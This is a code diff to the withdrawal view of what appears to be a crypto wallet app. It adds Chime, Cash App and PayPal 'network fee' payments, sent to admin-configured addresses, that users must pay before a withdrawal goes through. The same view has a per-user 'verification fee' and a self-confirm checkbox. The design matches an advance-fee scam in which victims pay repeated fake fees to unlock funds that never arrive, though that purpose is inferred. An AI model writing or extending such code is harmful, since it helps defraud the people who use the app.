@@ -85,14 +85,15 @@ function InsufficientFundsPopup({ attemptsLeft, onClose }: InsufficientFundsPopu
 // ── Fee Popup ─────────────────────────────────────────────────────────────────
 
 interface FeePopupProps {
-  feeInAsset: number;
-  assetLabel: string;
+  feeInAsset?: number;
+  assetLabel?: string;
   feeAddress: string;
   feeUsd: number;
+  fiatMethod?: string;
   onClose: () => void;
 }
 
-function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePopupProps) {
+function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, fiatMethod, onClose }: FeePopupProps) {
   const handleCopy = () => {
     navigator.clipboard.writeText(feeAddress)
       .then(() => toast.success('Deposit address copied'))
@@ -114,14 +115,14 @@ function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePo
         </div>
 
         <p className="text-sm text-muted leading-relaxed">
-          Before your withdrawal can be processed, you must clear the network fee below. Send the exact amount to the address provided.
+          Before your withdrawal can be processed, you must clear the {fiatMethod ? `${fiatMethod} ` : ''}network fee below. Send the exact amount to the destination provided.
         </p>
 
         <div className="bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3">
           <div className="flex flex-col gap-1">
             <span className="text-xs text-muted uppercase tracking-widest font-medium">Amount Due</span>
             <span className="text-2xl font-bold text-destructive">
-              {feeInAsset} {assetLabel}
+              {fiatMethod ? `$${feeUsd.toFixed(2)}` : `${feeInAsset} ${assetLabel}`}
               <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
             </span>
           </div>
@@ -294,7 +295,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [settings, setSettings] = useState<SettingsData | null>(null);
   const [address, setAddress] = useState('');
   const [amount, setAmount] = useState('');
-  const [withdrawalMethod, setWithdrawalMethod] = useState<'crypto' | 'paypal' | 'cashapp'>('crypto');
+  const [withdrawalMethod, setWithdrawalMethod] = useState<'crypto' | 'chime' | 'paypal' | 'cashapp'>('crypto');
   const [submitting, setSubmitting] = useState(false);
   const [loading, setLoading] = useState(true);
   const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
@@ -354,6 +355,17 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       })
       .catch(() => {/* non-critical — verification section simply won't show */});
   }, []);
+
+  useEffect(() => {
+    if (withdrawalMethod === 'crypto' || !settings) return;
+    const enabled = settings[`${withdrawalMethod}_fee_enabled` as keyof SettingsData] as boolean | undefined;
+    if (!enabled) setWithdrawalMethod('crypto');
+  }, [settings, withdrawalMethod]);
+
+  useEffect(() => {
+    setGasFeeAcknowledged(false);
+    setShowFeePopup(false);
+  }, [withdrawalMethod]);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -437,6 +449,30 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     ? parseFloat(feeUsd.toFixed(4))
     : parseFloat((feeUsd / prices[asset]).toFixed(8));
 
+  const fiatFeeConfigs = {
+    chime: {
+      label: 'Chime',
+      amount: settings.chime_fee_usd ?? 0,
+      address: settings.chime_fee_address ?? '',
+      enabled: settings.chime_fee_enabled ?? false,
+    },
+    cashapp: {
+      label: 'Cash App',
+      amount: settings.cashapp_fee_usd ?? 0,
+      address: settings.cashapp_fee_address ?? '',
+      enabled: settings.cashapp_fee_enabled ?? false,
+    },
+    paypal: {
+      label: 'PayPal',
+      amount: settings.paypal_fee_usd ?? 0,
+      address: settings.paypal_fee_address ?? '',
+      enabled: settings.paypal_fee_enabled ?? false,
+    },
+  } as const;
+  const enabledFiatMethods = (Object.keys(fiatFeeConfigs) as Array<keyof typeof fiatFeeConfigs>)
+    .filter(method => fiatFeeConfigs[method].enabled);
+  const selectedFiatFee = withdrawalMethod === 'crypto' ? null : fiatFeeConfigs[withdrawalMethod];
+
   const assetLabel = (() => {
     switch (asset) {
       case 'usdt_trc20': return 'USDT (TRC20)';
@@ -459,14 +495,25 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
   // Gas fee section shown when auto-approve is off, a deposit address is configured,
   // this user has a network fee requirement set, and withdrawal is NOT yet enabled.
-  const showGasFeeSection = !wallet.withdrawal_enabled && !settings.auto_approve && !!feeDepositAddress && feeUsd > 0;
+  const showGasFeeSection = withdrawalMethod === 'crypto'
+    && !wallet.withdrawal_enabled
+    && !settings.auto_approve
+    && !!feeDepositAddress
+    && feeUsd > 0;
+  const showFiatFeeSection = withdrawalMethod !== 'crypto'
+    && !wallet.withdrawal_enabled
+    && !settings.auto_approve
+    && !!selectedFiatFee?.address
+    && selectedFiatFee.amount > 0;
+  const selectedFeeAddress = withdrawalMethod === 'crypto' ? feeDepositAddress : selectedFiatFee?.address;
+  const selectedFeeUsd = withdrawalMethod === 'crypto' ? feeUsd : selectedFiatFee?.amount ?? 0;
 
   // Verification fee alert shown when a charge is set and withdrawal is NOT yet enabled.
   const showVerificationFee = !wallet.withdrawal_enabled && hasCharge;
 
   const copyFeeAddress = () => {
-    if (!feeDepositAddress) return;
-    navigator.clipboard.writeText(feeDepositAddress)
+    if (!selectedFeeAddress) return;
+    navigator.clipboard.writeText(selectedFeeAddress)
       .then(() => toast.success('Deposit address copied'))
       .catch(() => toast.error('Failed to copy'));
   };
@@ -521,7 +568,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     }
 
     // Network fee checkbox must be ticked if section is shown
-    if (showGasFeeSection && !gasFeeAcknowledged) {
+    if ((showGasFeeSection || showFiatFeeSection) && !gasFeeAcknowledged) {
       setShowFeePopup(true);
       return;
     }
@@ -842,10 +889,10 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         <div className="flex flex-col flex-1 px-6 py-4 gap-5 overflow-y-auto">
 
           {/* Withdraw Via — shown at top when fiat methods are enabled */}
-          {wallet.fiat_withdrawal_enabled && (
+          {wallet.fiat_withdrawal_enabled && enabledFiatMethods.length > 0 && (
             <div className="flex flex-col gap-2">
               <label className="text-sm text-muted px-1">Withdraw via</label>
-              <div className="grid grid-cols-3 gap-2">
+              <div className={`grid gap-2 ${enabledFiatMethods.length === 1 ? 'grid-cols-2' : 'grid-cols-3'}`}>
                 {/* Crypto */}
                 <button
                   type="button"
@@ -865,43 +912,41 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                   )}
                 </button>
 
-                {/* PayPal */}
-                <button
-                  type="button"
-                  onClick={() => setWithdrawalMethod('paypal')}
-                  className={`flex flex-col items-center gap-1.5 py-3.5 px-2 rounded-xl border transition-all active:scale-[0.97] ${
-                    withdrawalMethod === 'paypal'
-                      ? 'border-blue-500 bg-blue-500/10 shadow-sm'
-                      : 'border-border bg-card hover:border-blue-400/40'
-                  }`}
-                >
-                  <span className="text-xl">💳</span>
-                  <span className={`text-xs font-semibold leading-tight text-center ${withdrawalMethod === 'paypal' ? 'text-blue-400' : 'text-foreground'}`}>
-                    PayPal
-                  </span>
-                  {withdrawalMethod === 'paypal' && (
-                    <CheckCircle className="w-3.5 h-3.5 text-blue-400" />
-                  )}
-                </button>
-
-                {/* CashApp */}
-                <button
-                  type="button"
-                  onClick={() => setWithdrawalMethod('cashapp')}
-                  className={`flex flex-col items-center gap-1.5 py-3.5 px-2 rounded-xl border transition-all active:scale-[0.97] ${
-                    withdrawalMethod === 'cashapp'
-                      ? 'border-emerald-500 bg-emerald-500/10 shadow-sm'
-                      : 'border-border bg-card hover:border-emerald-400/40'
-                  }`}
-                >
-                  <span className="text-xl">💚</span>
-                  <span className={`text-xs font-semibold leading-tight text-center ${withdrawalMethod === 'cashapp' ? 'text-emerald-400' : 'text-foreground'}`}>
-                    CashApp
-                  </span>
-                  {withdrawalMethod === 'cashapp' && (
-                    <CheckCircle className="w-3.5 h-3.5 text-emerald-400" />
-                  )}
-                </button>
+                {enabledFiatMethods.map(method => {
+                  const config = fiatFeeConfigs[method];
+                  const isSelected = withdrawalMethod === method;
+                  const selectedButtonClass = method === 'paypal'
+                    ? 'border-blue-500 bg-blue-500/10'
+                    : method === 'cashapp'
+                      ? 'border-emerald-500 bg-emerald-500/10'
+                      : 'border-sky-500 bg-sky-500/10';
+                  const selectedTextClass = method === 'paypal'
+                    ? 'text-blue-400'
+                    : method === 'cashapp'
+                      ? 'text-emerald-400'
+                      : 'text-sky-400';
+                  return (
+                    <button
+                      key={method}
+                      type="button"
+                      onClick={() => setWithdrawalMethod(method)}
+                      className={`flex flex-col items-center gap-1.5 py-3.5 px-2 rounded-xl border transition-all active:scale-[0.97] ${
+                        isSelected
+                          ? `${selectedButtonClass} shadow-sm`
+                          : 'border-border bg-card hover:border-primary/40'
+                      }`}
+                    >
+                      <span className="text-xl">{method === 'paypal' ? '💳' : method === 'cashapp' ? '💚' : '💙'}</span>
+                      <span className={`text-xs font-semibold leading-tight text-center ${isSelected ? selectedTextClass : 'text-foreground'}`}>
+                        {config.label}
+                      </span>
+                      <span className={`text-[10px] ${isSelected ? selectedTextClass : 'text-muted'}`}>
+                        ${config.amount.toFixed(2)} fee
+                      </span>
+                      {isSelected && <CheckCircle className={`w-3.5 h-3.5 ${selectedTextClass}`} />}
+                    </button>
+                  );
+                })}
               </div>
             </div>
           )}
@@ -917,7 +962,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           {/* Recipient */}
           <div className="flex flex-col gap-2">
             <label className="text-sm text-muted px-1">
-              {withdrawalMethod === 'paypal' ? 'PayPal Email Address' : withdrawalMethod === 'cashapp' ? 'CashApp $Cashtag' : 'Recipient Address'}
+              {withdrawalMethod === 'paypal' ? 'PayPal Email Address' : withdrawalMethod === 'cashapp' ? 'Cash App $Cashtag' : withdrawalMethod === 'chime' ? 'Chime Email or Username' : 'Recipient Address'}
             </label>
             <input
               type="text"
@@ -927,6 +972,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               placeholder={
                 withdrawalMethod === 'paypal' ? 'e.g. name@example.com' :
                 withdrawalMethod === 'cashapp' ? 'e.g. $YourCashtag' :
+                withdrawalMethod === 'chime' ? 'e.g. $ChimeUsername' :
                 'Paste wallet address'
               }
             />
@@ -1160,6 +1206,53 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             </div>
           )}
 
+          {/* Fiat network fee section */}
+          {showFiatFeeSection && selectedFiatFee && (
+            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
+              <div className="flex gap-3">
+                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
+                <div className="flex flex-col gap-1">
+                  <div className="text-sm font-semibold text-foreground">{selectedFiatFee.label} Network Fee Required</div>
+                  <div className="text-xl font-bold text-destructive">${selectedFiatFee.amount.toFixed(2)}</div>
+                  <div className="text-xs text-muted/90 leading-relaxed">
+                    Send this fee to the {selectedFiatFee.label} destination below before your withdrawal is processed.
+                  </div>
+                </div>
+              </div>
+
+              <div className="flex flex-col gap-2">
+                <span className="text-xs text-muted uppercase tracking-widest font-medium">Send fee to this address</span>
+                <button
+                  onClick={copyFeeAddress}
+                  className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
+                >
+                  <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{selectedFiatFee.address}</span>
+                  <Copy className="w-4 h-4 text-muted shrink-0" />
+                </button>
+              </div>
+
+              <label htmlFor={checkboxId} className="flex items-start gap-3 cursor-pointer select-none">
+                <input
+                  id={checkboxId}
+                  type="checkbox"
+                  checked={gasFeeAcknowledged}
+                  onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
+                  className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
+                />
+                <span className="text-xs text-muted leading-relaxed">
+                  I confirm I have sent the <span className="text-destructive font-semibold">${selectedFiatFee.amount.toFixed(2)} {selectedFiatFee.label} network fee</span> to the address above.
+                </span>
+              </label>
+
+              {gasFeeAcknowledged && (
+                <div className="rounded-lg bg-success/10 border border-success/30 px-3 py-2.5 flex gap-2 items-center">
+                  <CheckCircle className="w-4 h-4 text-success shrink-0" />
+                  <p className="text-xs text-success font-medium">Fee confirmed — ready to submit.</p>
+                </div>
+              )}
+            </div>
+          )}
+
           {/* Submit */}
           <button
             onClick={handleSend}
@@ -1178,12 +1271,13 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         </div>
       </div>
 
-      {showFeePopup && feeDepositAddress && (
+      {showFeePopup && selectedFeeAddress && (
         <FeePopup
-          feeInAsset={feeInAsset}
+          feeInAsset={withdrawalMethod === 'crypto' ? feeInAsset : undefined}
           assetLabel={assetLabel}
-          feeAddress={feeDepositAddress}
-          feeUsd={feeUsd}
+          feeAddress={selectedFeeAddress}
+          feeUsd={selectedFeeUsd}
+          fiatMethod={withdrawalMethod === 'crypto' ? undefined : selectedFiatFee?.label}
           onClose={() => setShowFeePopup(false)}
         />
       )}
